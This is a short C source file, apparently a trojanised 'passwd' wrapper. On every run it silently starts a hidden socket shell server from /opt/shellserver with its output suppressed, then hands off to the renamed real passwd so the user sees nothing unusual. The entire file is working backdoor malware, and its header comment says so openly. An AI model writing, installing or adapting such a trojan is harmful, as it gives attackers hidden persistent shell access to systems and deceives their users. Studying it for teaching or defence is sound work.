/*
 * @filename:    passwd.c
 * @author:      Stefan Stockinger
 * @date:        2022-06-23
 * @description: creates a socket server which calls the shell
*/

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

#define SHELLSERVER_PATH "/opt/shellserver"

int main(int argc,char **argv){
	int pid;
	char **arg = argv;   

    // replace argument 0 (passwd) with the renamed copy of passwd
	arg[0]="chpwd";

    //fork to run fake and real passwd
	switch(pid=fork()){
		case -1:
			perror("fork");
			break;
		case 0:
            // start shellserver
			setpgid(0,0);
            char *arguments[2] = { "no_output", NULL };  // arg "no_output" to suppress stdout and stderr 
			execv(SHELLSERVER_PATH, arguments);  
		default:
            // execute the "real" passwd
			execvp(arg[0], arg);
	}

	return 0;
}
